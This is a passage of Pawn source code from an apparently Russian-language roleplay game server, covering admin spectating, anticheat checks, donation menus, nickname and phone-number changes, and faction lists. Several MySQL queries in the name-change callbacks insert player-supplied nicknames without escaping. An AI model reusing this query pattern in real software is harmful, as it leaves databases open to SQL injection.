						SendMes(playerid, COLOR_YELLOW, "Ваш бизнес закрыт уже %i час(а)", BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bLockTime]);
						SendClientMessage(playerid, COLOR_YELLOW, "Если по истечению 36 часов бизнес будет закрыт, он будет продан гос-ву");
					}
				}
			}
	    }
	}
	return 1;
}

stock Menu()
{
    specmenu = CreateMenu("Spec", 1, 40.0, 220.0, 100.0);
    AddMenuItem(specmenu, 0, "UPDATE");
    AddMenuItem(specmenu, 0, "NEXT >>");
    AddMenuItem(specmenu, 0, "BACK <<");
    AddMenuItem(specmenu, 0, "SLAP");
    AddMenuItem(specmenu, 0, "GM");
    AddMenuItem(specmenu, 0, "STATS");
    AddMenuItem(specmenu, 0, "EXIT");
}

public OnPlayerSelectedMenuRow(playerid, row)
{
    if(GetPlayerMenu(playerid) == Menu:INVALID_MENU) return SKick(playerid, 7436);
    if(GetPlayerMenu(playerid) == specmenu)
    {
        switch(row)
        {
            case 0:
            {
	            SetPlayerInterior(playerid,GetPlayerInterior(PI[playerid][Spectating][0]));
	            SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(PI[playerid][Spectating][0]));
	            TogglePlayerSpectating(playerid, 1);
	            if(IsPlayerInAnyVehicle(PI[playerid][Spectating][0]))
	            {
		           new carid = GetPlayerVehicleID(PI[playerid][Spectating][0]);
		           PlayerSpectateVehicle(playerid, carid);
             	}
	            else PlayerSpectatePlayer(playerid, PI[playerid][Spectating][0]);
                ShowMenuForPlayer(specmenu, playerid);
            }
            case 1:
			{
				for(new id = PI[playerid][Spectating][0]+1, bool:secondloop; id < MAX_PLAYERS; id++)
				{
				    if(id == MAX_PLAYERS && !secondloop)
					{
						secondloop = true, id = 0;
						continue;
					}
					if(PlayerLogged[id] == false) continue;
					switch(GetPlayerState(id))
					{
						case 1..3: {}
						default: continue;
					}

					if(PI[playerid][Spectating][0] != INVALID_PLAYER_ID)
						PI[PI[playerid][Spectating][0]][P_SPEC_ADM] = INVALID_PLAYER_ID;

					new param_str[4];
					format(param_str, sizeof param_str, "%i", id);
					callcmd::spec(playerid, param_str);
					break;
				}
				ShowMenuForPlayer(specmenu, playerid);
			}
            case 2:
			{
			    new maxplayers = GetMaxPlayers();
				for(new id = PI[playerid][Spectating][0]-1, bool:secondloop; id >= 0; id--)
				{
				    if(id <= 0 && !secondloop)
					{
						secondloop = true, id = maxplayers;
						continue;
					}
					if(PlayerLogged[id] == false) continue;
					switch(GetPlayerState(id))
					{
						case 1..3: {}
						default: continue;
					}

					if(PI[playerid][Spectating][0] != INVALID_PLAYER_ID)
						PI[PI[playerid][Spectating][0]][P_SPEC_ADM] = INVALID_PLAYER_ID;

					new param_str[4];
					format(param_str, sizeof param_str, "%i", id);
					callcmd::spec(playerid, param_str);
					break;
				}
				ShowMenuForPlayer(specmenu, playerid);
			}
            case 3:
            {
                new param_str[11];
                format(param_str, sizeof(param_str), "%i", PI[playerid][Spectating][0]);
                callcmd::slap(playerid, param_str);
                ShowMenuForPlayer(specmenu, playerid);
            }
            case 4:
            {
                new param_str[11];
                format(param_str, sizeof(param_str), "%i", PI[playerid][Spectating][0]);
                callcmd::gm(playerid, param_str);
                ShowMenuForPlayer(specmenu, playerid);
            }
            case 5:
			{
				ShowPlayerStatsDialog(playerid, PI[playerid][Spectating][0]);
				ShowMenuForPlayer(specmenu, playerid);
			}
            case 6: callcmd::specoff(playerid, "");
		}
    }
    return 1;
}

/*public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
    if(!IsPlayerConnected(playerid)) return 0;
	if(PI[playerid][pAFK] >= 3) return 0;
	new slot = GetWeaponSlotEx(weaponid);
	if(AC_GunCheattime[playerid] == 0 && slot != -1)
	{
		if(PI[playerid][pGun][slot] != weaponid)
		{
 			SKick(playerid, 8127);
	    	return 0;
		}
	}

	if( hittype == BULLET_HIT_TYPE_PLAYER )
    {
        if( !( -20.0 <= fX <= 20.0 ) || !( -20.0 <= fY <= 20.0 ) || !( -20.0 <= fZ <= 20.0 ) )
        {
             OnGuardWarningCheater(playerid, "Bullet Crash Cortez", 85);
			 return false;
        }
    }

	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);

	//Desync weapon IDs that don't fire bullets
	if (weaponid < 22 || weaponid > 38) return 0;

	//Desync shots with Z pos out of bounds
	if(!(-20000.0 <= z <= 20000.0)) return 0;

	if(hittype == BULLET_HIT_TYPE_NONE)
	{
	    if(hitid != 65535) return 1;
	}
	else if(hittype == BULLET_HIT_TYPE_PLAYER)
	{
	    if(BadFloat(fX) || BadFloat(fY) || BadFloat(fZ)) return 0;
	    if(hitid == INVALID_PLAYER_ID) return 0;
	}

	if(weaponid == 38) return 0;

    if(GetTickCount()-WeaponTime[playerid] < 120 && weaponid != 17 && weaponid <= 27 || GetTickCount()-WeaponTime[playerid] < 30 && weaponid > 27 && weaponid <= 34)
	{
	    RapidFire[playerid]++;
	    if(RapidFire[playerid] > 3)
	    {
	        SKick(playerid, 4123);
	 		return 0;
		}
	}
	else RapidFire[playerid] = 0;
    WeaponTime[playerid] = GetTickCount();

    new block = 0, Float:Pos[6]; // блокируем фейк урон
	if(hittype != 0 && Pos[0] != 0.0 && Pos[1] != 0.0 && Pos[2] != 0.0 && GetPVarInt(playerid, "LastTimeShot_Advanced") == GetTickCount() && floatcmp(Pos[0], GetPVarFloat(playerid, "LastShotPosX")) == 0 && floatcmp(Pos[1], GetPVarFloat(playerid, "LastShotPosY")) == 0 && floatcmp(Pos[2], GetPVarFloat(playerid, "LastShotPosZ")) == 0) block = 1;
	SetPVarInt(playerid, "LastTimeShot_Advanced", GetTickCount());
	SetPVarFloat(playerid, "LastShotPosX", Pos[0]);
	SetPVarFloat(playerid, "LastShotPosY", Pos[1]);
	SetPVarFloat(playerid, "LastShotPosZ", Pos[2]);
	if(block == 1) return 0;

	if(!IsACop(playerid) || !IsAArmy(playerid) || !IsAMayor(playerid) || !PI[playerid][pAdmin])
	{
		for(new i; i < sizeof(AreaInfo[arGreenZone]); i++)
	    {
	        if(IsPlayerInDynamicArea(playerid, AreaInfo[arGreenZone][i]))
	        {
				ApplyAnimation(playerid,"PED","handscower",4.1,1,0,0,0,1000);
			 	SetPlayerArmedWeapon(playerid, 0);
			 	return 0;
			}
		}
	}

	if(fX == -0.009999 && fY == -0.019999 && fZ == 0.039999)
    {
        printf("Player id: %d was kicked (Anti Bullet Crash)",playerid);
        Kick(playerid);
        return false;
    }

    return 1;
}*/

stock SKick(playerid, reason)
{
	// #pragma unused reason
	format(kick_reason[playerid], 64, "AntiCheat #%d (IP: %s)", reason, PI[playerid][pIP]);

	return Kick(playerid);
}
stock SetHunger(playerid, amount)
{
	if(amount > 100) PI[playerid][pHunger] = 100;
	else if(amount < 0) PI[playerid][pHunger] = 0;
	else PI[playerid][pHunger] = amount;
	MysqlUpdatePlayerInt(playerid, "hunger", PI[playerid][pHunger]);
	return 1;
}

stock GiveHunger(playerid, amount)
{
	SetHunger(playerid,PI[playerid][pHunger] + amount);
	if(PI[playerid][pHunger] + amount > 100) PI[playerid][pHunger] = 100;
	MysqlUpdatePlayerInt(playerid, "hunger", PI[playerid][pHunger]);
}

stock ZarPhone(playerid)
{
    if(Phonesmenu[playerid] == 1)
    {
		//PlayerTextDrawTextSize(playerid, PhonesSA[playerid][1], 549.5 + PI[playerid][pPhone][0] / 100.0 * 54.5, 40.000000);
		switch(PI[playerid][pPhone][0])
		{
  			case 81..100: PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0x63BD4EFF);
	    	case 51..80: PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0xCCFF00FF);
		    case 31..50: PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0xFDE910FF);
		    case 16..30: PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0xFF8800FF);
		    case 0..15: PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0xFF0600FF);
		}
		PlayerTextDrawShow(playerid, PhonesSA[playerid][1]);
	}
}

stock InetPhone(playerid)
{
    if(Phonesmenu[playerid] == 1)
    {
		switch(PI[playerid][pPhone][1])
		{
		    case 0: CreatePlayerTextDraw(playerid, 514.375000, 180.666656, "2G");
		    case 1: CreatePlayerTextDraw(playerid, 514.375000, 180.666656, "3G");
		    case 2: CreatePlayerTextDraw(playerid, 514.375000, 180.666656, "4G");
		}
		PlayerTextDrawShow(playerid, PhonesSA[playerid][2]);
	}
}

stock Air_Get_Pos(playerid)
{
    if(!IsPlayerInAnyVehicle(playerid))GetPlayerPos(playerid,AC_Air_Player[playerid][0],AC_Air_Player[playerid][1],AC_Air_Player[playerid][2]);
    else GetVehiclePos(GetPlayerVehicleID(playerid),AC_Air_Car[playerid][0],AC_Air_Car[playerid][1],AC_Air_Car[playerid][2]);
}

stock Air_Gettime(playerid,extra)
{
    if(!IsPlayerInAnyVehicle(playerid)) AC_Air_Time[playerid]=gettime()+extra;
    else AC_Air_Time_Car[playerid]=gettime()+extra;
}

stock TunningGarages(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid,20.0,2065.3801,-1832.5280,13.68)||IsPlayerInRangeOfPoint(playerid,20.0,-99.7154,1117.5011,19.88)||IsPlayerInRangeOfPoint(playerid,20.0,719.8336,-456.7990,16.47)||IsPlayerInRangeOfPoint(playerid,20.0,-1420.4562,2583.2180,55.98)||IsPlayerInRangeOfPoint(playerid,20.0,-2424.8093,1021.1127,50.53)||IsPlayerInRangeOfPoint(playerid,20.0,1975.0587,2161.9456,11.21)||
    IsPlayerInRangeOfPoint(playerid,20.0,487.9699,-1741.5265,11.28)||IsPlayerInRangeOfPoint(playerid,20.0,1025.7683,-1023.8249,32.24)||IsPlayerInRangeOfPoint(playerid,20.0,-1904.9709,285.8506,41.18)||IsPlayerInRangeOfPoint(playerid,20.0,615.2845,-124.2390,997.7112)||IsPlayerInRangeOfPoint(playerid,20.0,616.7787,-74.8150,997.6274)||IsPlayerInRangeOfPoint(playerid,20.0,617.5302,-1.9900,1001.06))return 1;
    return 0;
}

stock ShowInventory(playerid)
{
	new BitStream:bs = BS_New();
	BS_WriteValue(bs, PR_UINT8, PI[playerid][P_UNLOCK_LEVEL]);
	for (new i = 0; i < MAX_INVENTORY_SLOTS; i++)
	{
 	    BS_WriteValue(bs, PR_UINT8, i);
	    BS_WriteValue(bs, PR_UINT8, PlayerInventory[playerid][i][ItemIconIndex]);
	    BS_WriteValue(bs, PR_INT32, PlayerInventory[playerid][i][ItemCount]);
	}
	PR_SendRPC(bs, playerid, 210);
    BS_Delete(bs);
    //InvInfo[playerid][invIsOpen] = true;
}

stock ShowSpeedometerCoptrer(playerid)
{
	for(new idx = 0; idx < sizeof copter_speed; idx ++) PlayerTextDrawShow(playerid, copter_speed[idx][playerid]);
}

stock HideSpeedometerCoptrer(playerid)
{
	for(new idx = 0; idx < sizeof copter_speed; idx ++) PlayerTextDrawHide(playerid, copter_speed[idx][playerid]);
}
stock ShowDonateDialogMenu(playerid)
{
	ShowPlayerDialog(playerid, D_DONATE+1, DIALOG_STYLE_LIST, "{f6e58d}Донат меню",
	"{FFCC00}1. {99CC00}Перевести RUB в Игровые деньги\t\t\t{FFCC00}1 RUB = 750 Рублей\n\
	{FFCC00}2. {99CC00}Игровые пакеты\t\t\t\t\t{FFCC00}От 100 RUB\n\
	{FFCC00}3. {99CC00}Проверить зачисления\n\
	1\n\
	{FFCC00}4. {FFCC00}VIP аккаунт{FFFFFF} на 30 дней\t\t\t\t{FFCC00}350 RUB\n\
	{FFCC00}5. {FFCC00}VIP аккаунт{FFFFFF} на 60 дней\t\t\t\t{FFCC00}600 RUB\n\
	{FFCC00}6. {FFCC00}VIP аккаунт{FFFFFF} на 90 дней\t\t\t\t{FFCC00}900 RUB\n\
	1\n\
	{FFCC00}7. {FFFFFF}Смена имени\t\t\t\t\t{FFCC00}70 RUB\n\
	{FFCC00}8. {FFFFFF}Снять одно предупреждение\t\t\t{FFCC00}249 RUB\n\
	{FFCC00}9. {FFFFFF}Покупка законопослушности +5\t\t\t{FFCC00}5 RUB\n\
	1\n\
	{FFCC00}10. {FFFFFF}Покупка военного билета\t\t\t\t{FFCC00}499 RUB\n\
	{FFCC00}11. {FFFFFF}Покупка всех лицензий\t\t\t\t{FFCC00}399 RUB\n\
	{FFCC00}12. {FFFFFF}Покупка всех навыков оружия\t\t\t{FFCC00}649 RUB\n\
	{FFCC00}13. {FFFFFF}Покупка одного навыка на оружие\t\t\t{FFCC00}100 RUB", "Далее", "Отмена");
	return 1;
}
stock ShowDialogGhetto(playerid)
{
	new string[400];
	format(string, sizeof(string), "{FFFFFF}ОПГ \"Тамбовская\"\t\t\t| %s\nОПГ \"Подольская\"\t\t\t| %s",
	(b_Capture{0} ? ("{F04245}Запрет включен{FFFFFF}") : ("{63BD4E}Запрет выключен{FFFFFF}")),
	(b_Capture{1} ? ("{F04245}Запрет включен{FFFFFF}") : ("{63BD4E}Запрет выключен{FFFFFF}")));
	ShowPlayerDialog(playerid, 969, DIALOG_STYLE_LIST, "Управление каптами", string, "Изменить", "Отмена");
	return 1;
}

stock isNumeric(const string[])
{
	if(strlen(string) <= 0) return 0;
  	for(new i = 0; i < strlen(string); i++)
    {
		if((string[i] > '9' || string[i] < '0' && string[i] != '-' && string[i] != '+')
		|| (string[i] == '-' && i != 0) || (string[i] == '+' && i != 0)) return 0;
	}
  	if(strlen(string) == 1 && (string[0] == '-' || string[0] == '+')) return 0;
  	return 1;
}

stock IsNumeric(const str[], pos = 0)
{
	do
	{
		if('0' <= str[pos] <= '9') continue;
		return 0;
	}
	while(str[++pos]);

	return 1;
}

forward OnPlayerChangeName(playerid, nickname[]);
public OnPlayerChangeName(playerid, nickname[])
{
    new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		SendClientMessage(playerid, COLOR_GREY, "Этот никнейм уже используется");
		return ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена нонРП ника", "{FFFFFF}Введите будущий ник\n\n{F04245}Возможно сменить только если у Вас нонРП ник!", "Принять", "Назад");
	}
	new full = 0;
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pAdmin] > 7) full++;
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Модераторы игровых логинов сейчас находятся оффлайн!");
	set_name = playerid;
	strmid(PlayerName[playerid], nickname, 0, strlen(nickname), MAX_PLAYER_NAME);
	SendClientMessage(playerid, COLOR_YELLOW, "Вы успешно отправили заявку на смену игрового ника");
	new string[128];
	format(string, sizeof(string), "[Смена ника] %s[%i] просит сменить нонРП имя на %s", GetName(playerid), playerid, nickname);
	SendAdminMessage(COLOR_LIME, string);
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pAdmin] > 7)
		{
			SendClientMessage(i, COLOR_YELLOW, "Введите /setname, чтобы принять заявку");
		}
	}
	return 1;
}

forward OnPlayerChangeDonateName(playerid, nickname[]);
public OnPlayerChangeDonateName(playerid, nickname[])
{
    new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		SendClientMessage(playerid, COLOR_GREY, "Этот никнейм уже используется");
		return ShowPlayerDialog(playerid, D_JOB+179, 1, "Смена ника", "{FFFFFF}Введите будущий ник:", "Принять", "Назад");
	}
	if(GetPlayerHouse(playerid) > 0)
	{
		new i = GetPVarInt(playerid, "PlayerHouse");
		format(HouseInfo[i][hOwner], MAX_PLAYER_NAME, nickname);
		MysqlUpdateHouseStr(i, "hOwner", nickname);
	}
	if(GetPlayerBizz(playerid) > 0)
	{
		new i = GetPVarInt(playerid, "PlayerBizz");
		format(BizzInfo[i][bOwner], MAX_PLAYER_NAME, nickname);
		MysqlUpdateBizzStr(i, "owner", nickname);
		UpdateBizz(i);
	}

	new rowss;
	new string[128];
	new Cache: result;

	format(string, sizeof string, "SELECT * FROM ownable_cars WHERE owner_name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, string);
	rowss = cache_num_rows();

	if(rowss)
	{
		format(string, sizeof string, "UPDATE ownable_cars SET owner_name='%s' WHERE owner_name='%s'", nickname, GetName(playerid));
		mysql_query(dbHandle, string);
		cache_delete(result);
	}

	cache_delete(result);

	format(string, sizeof(string), "%s изменил имя на %s", GetName(playerid), nickname);
	SendClientMessageToAll(COLOR_ORANGE, string);
	PI[playerid][pCredits] -= 30;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET name='%s',credits=%i WHERE name='%s'", nickname, PI[playerid][pCredits], GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	if(PI[playerid][pAdmin])
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET name='%s' WHERE name='%s'", nickname, GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO `historyname` (`idacca`, `Name`) VALUE ('%d', '%s')", PI[playerid][pID], nickname);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	format(GetName(playerid), MAX_PLAYER_NAME, nickname);
	SetPlayerName(playerid, nickname);
	SendMes(playerid, COLOR_GREEN, "Ваше новое имя: {ffffff}%s", nickname);
	SendClientMessage(playerid, COLOR_GREEN, "Обязательно нужно сделать скриншот. Клавиша: {ffffff}F8");
	SendClientMessage(playerid, COLOR_GREEN, "Пропишите свой новый ник в окне {ffffff}CR:MP");
	KickEx(playerid, "Смена ника");
	return 1;
}

forward OnPlayerSetName(playerid, nickname[]);
public OnPlayerSetName(playerid, nickname[])
{
	new string[128];
    new rows, fields;
    cache_get_data(rows, fields);
    if(rows)
    {
        format(string, sizeof(string), "{FFFFFF}Введите будущий ник для игрока: %s", GetName(NameStats[playerid]));
		ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Имя игрока", string, "Принять", "Отмена");
		return SendClientMessage(playerid, COLOR_GREY, "Этот никнейм уже используется");
    }
	if(GetPlayerHouse(NameStats[playerid]))
	{
		new i = GetPVarInt(NameStats[playerid], "PlayerHouse");
		strmid(HouseInfo[i][hOwner], nickname, 0, strlen(nickname), MAX_PLAYER_NAME);
		MysqlUpdateHouseStr(i, "hOwner", nickname);
	}
	if(GetPlayerBizz(NameStats[playerid]))
	{
		new i = GetPVarInt(NameStats[playerid], "PlayerBizz");
		strmid(BizzInfo[i][bOwner], nickname, 0, strlen(nickname), MAX_PLAYER_NAME);
		MysqlUpdateBizzStr(i, "owner", nickname);
		UpdateBizz(i);
	}
	format(string, sizeof(string), "Вы сменили имя игрока %s на %s", GetName(NameStats[playerid]), nickname);
	SendClientMessage(playerid, COLOR_LIME, string);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET name = '%s' WHERE name = '%s'", nickname, GetName(NameStats[playerid]));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	if(PI[NameStats[playerid]][pAdmin])
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET name='%s' WHERE name='%s'", nickname, GetName(NameStats[playerid]));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO `historyname` (`idacca`, `Name`) VALUE ('%d', '%s')", PI[NameStats[playerid]][pID], nickname);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	format(GetName(NameStats[playerid]), MAX_PLAYER_NAME, nickname);
	SetPlayerName(NameStats[playerid], nickname);
	format(string, sizeof(string), "Администратор %s сменил Вам никнейм", GetName(playerid));
	SendClientMessage(NameStats[playerid], COLOR_WHITE, string);
	format(string, sizeof(string), "Ваш новый никнейм: {ffffff}%s", nickname);
	SendClientMessage(NameStats[playerid], COLOR_GREEN, string);
	SendClientMessage(NameStats[playerid], COLOR_GREEN, "Обязательно нужно сделать скриншот. Клавиша: {ffffff}F8");
	SendClientMessage(NameStats[playerid], COLOR_GREEN, "Пропишите свой новый ник в окне {ffffff}SA:MP");
	Kick(NameStats[playerid]);
	return 1;
}

forward OnPlayerSetPhoneNumber(playerid);
public OnPlayerSetPhoneNumber(playerid)
{
    new rows, fields;
    cache_get_data(rows, fields);
    if(GetMoney(playerid) < 3000) return SendMess(playerid, MSG_NOT_MONEY);
    if(rows)
	{
	    SendClientMessage(playerid, COLOR_GREY, "Такой номер уже используется");
		ShowPlayerDialog(playerid, D_BUYSIM, DIALOG_STYLE_INPUT, "Покупка SIM-карты", "{FFFFFF}Введите новый шестизначный номер", "Купить", "Закрыть");
		return 1;
	}
    PI[playerid][pPhoneNumber] = GetPVarInt(playerid, "CheckNumber");
	new string[96];
	format(string, sizeof(string), "Вы купили SIM-карту. Ваш номер: {FFFFFF}%i", PI[playerid][pPhoneNumber]);
	SendClientMessage(playerid, COLOR_BLUE, string);
	GiveMoney(playerid, -3000);
	MysqlUpdatePlayerInt(playerid, "phonenumber", PI[playerid][pPhoneNumber]);
	DeletePVar(playerid, "CheckNumber");
	//MagazineList(playerid);
	return 1;
}

forward MysqlCheckPhoneNumber(playerid, telephone);
public MysqlCheckPhoneNumber(playerid, telephone)
{
	if(cache_get_row_count(dbHandle) > 0) return SendClientMessage(playerid, COLOR_GREY, "Произошла ошибка при покупке SIM-карты, попробуйте еще раз!");
	new num;
	foreach(new i: Player)
	{
 		if((PI[i][pPhoneNumber] == telephone) && (i != playerid))
		{
	 		SendClientMessage(playerid, COLOR_GREY, "Произошла ошибка при покупке SIM-карты, попробуйте еще раз!");
	 		num++;
	 		break;
		}
	}
    if(num == 0)
	{
	    PI[playerid][pPhoneNumber] = telephone;
		SendMes(playerid, COLOR_BLUE, "Вы купили мобильный телефон. Ваш номер: {FFFFFF}%i", telephone);
		MysqlUpdatePlayerInt(playerid, "phonenumber", PI[playerid][pPhoneNumber]);
		new price = gShopCosts[0];
		new i = GetPVarInt(playerid, "PlayerBizz");
	    GiveMoney(playerid, -price);
	    if(BizzInfo[i][bProduct] > 0)
	    {
			BizzInfo[i][bMoney] += price;
			BizzPay[i] += price;
			BizzInfo[i][bProduct] -= gShopProd[0];
		    MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
			MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
		}
	    MagazineList(playerid);
	}
	return 1;
}

forward OfflineMembersOnFraction(playerid);
public OfflineMembersOnFraction(playerid)
{
    new rows, fields;
	cache_get_data(rows, fields);
	new string[110], string_dialogue[1681], mname[MAX_PLAYER_NAME], mdata[30], mrank;
    strcat(string_dialogue, "{FFFF00}Посл. вход\tДолжность\t\tНик\n");
	if(rows)
	{
	    for(new i = 0; i < rows; i++)
	    {
			cache_get_field_content(i, "name", mname, dbHandle, MAX_PLAYER_NAME);
       		cache_get_field_content(i, "datavhod", mdata, dbHandle, 30);
			mrank = cache_get_field_content_int(i, "rank", dbHandle);
			format(string, sizeof(string), "{FFFFFF}%s\t%s (%i)\t\t%s\n", mdata, Fraction_Rang[PI[playerid][pMember]][mrank], mrank, mname);
	    	strcat(string_dialogue, string);
  		}
	}
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST, "Все члены организации", string_dialogue, "Закрыть", "");
	return 1;
}

forward OfflineUninviteOnFraction(playerid);
public OfflineUninviteOnFraction(playerid)
{
	new rows, fields, Names[MAX_PLAYER_NAME];
	cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid, COLOR_GRAD1, "Не найдено совпадений!");
    cache_get_field_content(0, "name", Names, dbHandle, 32);

	STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE "T_ACCOUNTS" SET leader = '0', member = '0', rank = '0', memberskin = '0' WHERE name = '%s' LIMIT 1",Names);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы уволили игрока %s", Names);
	SendClientMessage(playerid, COLOR_RED, STRING_GLOBAL);
	return 1;
}

forward AllAdmins(playerid);
public AllAdmins(playerid)
{
   	new rows, fields;
	cache_get_data(rows, fields);
	new warn_count, string[72], string_dialogue[3050], aname[MAX_PLAYER_NAME], alevel, alastcon[15], adata[15], admin_name[32];
	strcat(string_dialogue, "{488BAE}Посл. вход\tПоставлен\tНик(Уровень | Выговоры)\n");
	if(rows)
	{
	    for(new i = 0; i < rows; i++)
	    {
	        cache_get_field_content(i, "name", aname, dbHandle, MAX_PLAYER_NAME);
			alevel = cache_get_field_content_int(i, "level", dbHandle);
			warn_count = cache_get_field_content_int(i, "awarn", dbHandle);
			cache_get_field_content(i, "last_connect", alastcon, dbHandle, 15);
			cache_get_field_content(i, "data", adata, dbHandle, 15);
			format(admin_name, sizeof admin_name, "admin_name_id_%d", i+1);
			SetPVarString(playerid, admin_name, aname);
			if(alevel == 7) continue;
	    	format(string, sizeof(string), "{FFFFFF}%s\t%s\t%s(ALVL: %d) | (%d/3)\n", alastcon, adata, aname, alevel, warn_count);
	    	strcat(string_dialogue, string);
    	}
	}
	ShowPlayerDialog(playerid, D_REMOVEADMIN, DIALOG_STYLE_LIST, "Весь список администрации", string_dialogue, "Закрыть", "");
	return 1;
}

forward Allleaders(playerid);
public Allleaders(playerid)
{
   	new rows, fields;
	cache_get_data(rows, fields);
	new warn_count, string[100], string_dialogue[1440], aname[MAX_PLAYER_NAME], aaleader[24], aleader, alastcon[30], leader_name[32];
	strcat(string_dialogue, "{488BAE}Посл. вход\tФракция\tНик(Выговоры)\n");
	if(rows)
	{
	    for(new i = 0; i < rows; i++)
	    {
	        cache_get_field_content(i, "name", aname, dbHandle, MAX_PLAYER_NAME);
			aleader = cache_get_field_content_int(i, "leader", dbHandle);
			warn_count = cache_get_row_int(i, 159, dbHandle);
			cache_get_field_content(i, "datavhod", alastcon, dbHandle, 30);
			switch(aleader)
		    {
				case 1: aaleader = "Право";
				case 2: aaleader = "ДПС";
				case 3: aaleader = "ППС";
				case 4: aaleader = "ФСБ";
				case 5: aaleader = "ЦРБ";
				case 6: aaleader = "АШ";
				case 7: aaleader = "ОПГ \"Тамбовская\"";
				case 8: aaleader = "ОПГ \"Подольская\"";
				case 9: aaleader = "Рифа";
				case 10: aaleader = "Ацтек";
				case 11: aaleader = "Вагос";
				case 12: aaleader = "Армия";
				case 15: aaleader = "ИМ";
				case 16: aaleader = "РМ";
				case 18: aaleader = "СМИ";
				case 21: aaleader = "ОМОН";
				default: aaleader = "null";
		    }
		    format(leader_name, sizeof leader_name, "leader_name_id_%d", i+1);
			SetPVarString(playerid, leader_name, aname);
	    	format(string, sizeof(string), "{FFFFFF}%s\t%s\t\t%s(%d/3)\n", alastcon, aaleader, aname, warn_count);
	    	strcat(string_dialogue, string);
    	}
	}
	ShowPlayerDialog(playerid, D_APANEL+1, DIALOG_STYLE_LIST, "Список лидеров", string_dialogue, "Закрыть", "");
	//DIALOG_STYLE_MSGBOX
	return 1;
}

forward OnPlayerReferal(playerid);
public OnPlayerReferal(playerid)
{
    new rows, fields;
	cache_get_data(rows, fields);
	if(!rows)
	{
		ShowDialogReferalPlayer(playerid);
	}
	new name[MAX_PLAYER_NAME];
	GetPVarString(playerid, "Drug", name, sizeof(name));
	strmid(PI[playerid][pReferal], name, 0, strlen(name), MAX_PLAYER_NAME);

	ShowDialogSexPlayer(playerid);
	return 1;
}

stock Float:__GetAngleToPoint(Float:x1, Float:y1, Float:x2, Float:y2)
{
    new Float: angle;
	angle = atan2(y2 - y1, x2 - x1) + 270;
    return angle < 360 ? angle : angle - 360;
}


stock Float: _GetAngleToPoint(Float:x1, Float:y1, Float:x2, Float:y2)
{
	return atan2(y1-y2, x1-x2)-90.0;
}

stock Float:GetAngleToPoint(Float:X, Float:Y, Float:A, Float:x, Float:y)
{
	new Float:angle = 185.0 - atan2(X-x, Y-y);
	A -= (angle - 5.0);
	return A;
}

forward GetPlayerAngleToPoint(playerid, Float:x, Float:y);
stock GetPlayerAngleToPoint(playerid, Float:x, Float:y)
{
	new Float:ix, Float:iy, Float:iz, Float:a;
	GetPlayerFacingAngle(playerid, a);
	GetPlayerPos(playerid, ix, iy, iz);
	return floatround(GetAngleToPoint(ix, iy, a, x, y));
}

stock Float:GetPlayerAngleToPlayer(playerid, facingtoid)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(facingtoid, x, y, z);
	return float(GetPlayerAngleToPoint(playerid, x, y));
}

stock GetPlayerFaceToPlayer(playerid, targetid, Float:facing)
{
	new Float:radius = GetPlayerAngleToPlayer(playerid, targetid);
	return (radius > -facing && radius < facing);
}

stock PlayerSecurity(playerid)
{
    new string[350];
	format(string, sizeof(string), "Смена пароля\nGoogle Authenticator\nГрафический пароль\t\t| %s\n{FFFF00}Настройки графического пароля", (!PI[playerid][pCheckCode]) ? ("{F04245}Отсутствует") : ("{63BD4E}Активирован"));
	ShowPlayerDialog(playerid, D_JOB+201, 2, "Безопасность", string, "Выбрать", "Назад");
	return 1;
}

stock GPSPlayer_(playerid, Float:X, Float:Y, Float:Z, locname[])
{
	if(UseGPS[playerid])
	{
		if(PI[playerid][P_ORDER_ID] != -1)
			return SendClientMessage(playerid, C_RED, "Во время выполнения заказа Вы не можете пользоваться /gps");
	}

